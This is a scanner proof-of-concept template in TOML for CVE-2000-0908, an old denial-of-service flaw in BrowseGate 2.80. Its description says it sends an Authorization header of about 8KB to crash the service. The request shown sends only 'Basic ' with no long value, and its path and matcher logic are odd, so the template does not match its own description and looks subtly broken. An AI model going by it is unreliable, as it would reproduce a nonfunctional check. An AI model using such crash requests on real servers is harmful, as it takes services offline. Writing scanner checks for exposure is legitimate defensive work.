[info]
author = "AVE"
description = "检测 BrowseGate 2.80 是否因超长 HTTP Authorization 头导致崩溃。通过发送包含约 8KB 字符的 Authorization 头，可触发 brwgate.exe 非法读取错误，导致服务拒绝服务。"
id = "POC-AVE-2000-0663"
name = "CVE-2000-0908 PoC"
severity = "medium"
tags = [
    "cve-2000-0908",
    "browsegate",
    "dos",
]
vuln_id = [
    "CVE-2000-0908",
    "AVE-2000-0663",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic "
From = "poc@test.com"
If-Modified-Since = "Sat, 29 Oct 1994 19:43:31 GMT"
Referer = "http:"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "Connection: close",
    "500",
]
